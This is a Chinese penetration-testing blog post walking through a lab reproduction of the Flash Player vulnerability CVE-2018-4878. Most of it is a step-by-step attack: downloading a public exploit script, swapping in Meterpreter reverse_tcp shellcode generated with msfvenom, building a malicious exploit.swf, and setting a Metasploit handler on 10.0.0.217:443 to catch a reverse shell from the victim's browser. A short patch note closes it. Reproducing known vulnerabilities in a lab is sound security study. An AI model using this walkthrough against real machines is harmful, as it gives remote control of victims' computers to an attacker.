# Flash 0day CVE-2018-4878 漏洞复现 - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/8523299.html`](https://www.cnblogs.com/backlion/p/8523299.html)

## 0x01 前言

Adobe 公司在当地时间 2018 年 2 月 1 日发布了一条安全公告：

[`helpx.adobe.com/security/products/flash-player/apsa18-01.html`](https://helpx.adobe.com/security/products/flash-player/apsa18-01.html)

公告称一个新的 Flash 0Day 漏洞（CVE-2018-4878）已经存在野外利用，可针对 Windows 用户发起定向攻击。攻击者可以诱导用户打开包含恶意 Flash 代码文件的 Microsoft Office 文档、网页、垃圾电子邮件等。

## 0x02 漏洞影响

Flash Player 当前最新版本 28.0.0.137 以及之前的所有版本

## 0x03 漏洞复现

**环境测试：**

**攻击机：kali **

**目标靶机：win7x64 +IE8.0+FLASH player28.0.0.137**

1.下载 cve-2018-4878 的脚步利用

wget https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar

2.解压压缩文件后，可看到 cve-2018-4878.py 和 exploit.swf

![](img/0bedeec9119fa20954d9af1612d5b2c6.png) 3.我们需要对 cve-2018-4878.py 进行修改，原作者将代码中的 stageless 变量改成了 true，正确的应该改成：stageless = False。附上原作者的 exp 地址：https://github.com/anbai-inc/CVE-2018-4878.git

![](img/3319e06664db9347dbc446f80841b95b.png)

4.其次需要修改替换原来弹计算器的 shellcode

![](img/2c51241b6b099b546ba3090a478e90b2.png)

5.在 kali 下生成 msf 的 shellcode:

msfvenom -pwindows/meterpreter/reverse_tcplhost=your host lport=your port  -fpython>shellcode.txt

![](img/db256179822da2ba20bbab579e437390.png)

6.将生成的 shellcode 替换掉原有 cve-2018-4878.py 中的 shelldoce 即可

![](img/e588ff6420e6f85698315a18b02cc2a3.png)

7.在 kal 下执行 cve-2018-4878.py,这里需要和 index.html 在一个目录下，即可生成恶意的 exploit.swf

![](img/cc2fd3da9231c6ced963472f34aad341.png)

8.这里为了演示我将 index.html 和 exploit.swf 一同拷贝到目标靶机 win7x64 上，在 ie 浏览器下打开（也可以通过搭建 web 服务器的形式将 index.html 和 exploit.swf 放在 web 目录下,访问地址来打开）。

![](img/1259bd596d2b8178b8543b5bd59914d1.png)

9.在 msf 下进行监听设置

msf > use exploit/multi/handler

msf exploit(handler) > set payloadwindows/meterpreter/reverse_tcp

msf exploit(handler) > set lhost 10.0.0.217

msf exploit(handler) > set lport 443

msf exploit(handler) > exploit

![](img/5c30c0c645ce7aeee9f7ffade0d77907.png)

10.当打开目标恶意的 index.html 页面时，即可触发反弹 shell

![](img/6020a82065b9bf81754bb815969d7bfe.png)

## 0x04 漏洞修复

建设通过官方网站升级到最新版本

https://get.adobe.com/cn/flashplayer/

[ ](http://www.wiz.cn/i/86eb9c97 "来自为知笔记(Wiz)")